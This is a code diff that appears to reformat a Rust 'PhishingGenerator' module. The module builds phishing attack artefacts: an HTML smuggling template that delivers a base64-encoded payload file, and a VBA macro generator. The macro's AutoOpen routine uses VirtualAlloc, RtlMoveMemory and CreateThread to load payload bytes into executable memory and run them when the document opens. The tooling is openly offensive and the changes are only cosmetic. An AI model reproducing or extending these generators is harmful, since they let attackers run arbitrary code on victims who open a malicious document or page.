@@ -6,7 +6,8 @@ impl PhishingGenerator {
     pub fn generate_html_smuggling(payload: &[u8], filename: &str) -> String {
         let b64 = general_purpose::STANDARD.encode(payload);
         // Basic HTML Smuggling template
-        format!(r###"<!DOCTYPE html>
+        format!(
+            r###"<!DOCTYPE html>
 <html>
 <head><title>Document</title></head>
 <body>
@@ -41,32 +42,38 @@ impl PhishingGenerator {
     }}
 </script>
 </body>
-</html>"###, filename, b64)
+</html>"###,
+            filename, b64
+        )
     }
 
     pub fn generate_macro_vba(payload: &[u8]) -> String {
-        let mut vba = String::from(r#"
+        let mut vba = String::from(
+            r#"
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
 
 Sub AutoOpen()
-"#);
+"#,
+        );
         vba.push_str("    Dim code() As Byte\n");
         vba.push_str(&format!("    ReDim code({})\n", payload.len() - 1));
-        
+
         // Chunk bytes to avoid huge lines
         for (i, byte) in payload.iter().enumerate() {
             vba.push_str(&format!("    code({}) = {}\n", i, byte));
         }
-        
-        vba.push_str(r#"
+
+        vba.push_str(
+            r#"
     Dim addr As LongPtr
     addr = VirtualAlloc(0, UBound(code) + 1, &H1000, &H40)
     RtlMoveMemory addr, code(0), UBound(code) + 1
     CreateThread 0, 0, addr, 0, 0, 0
 End Sub
-"#);
+"#,
+        );
         vba
     }
 }
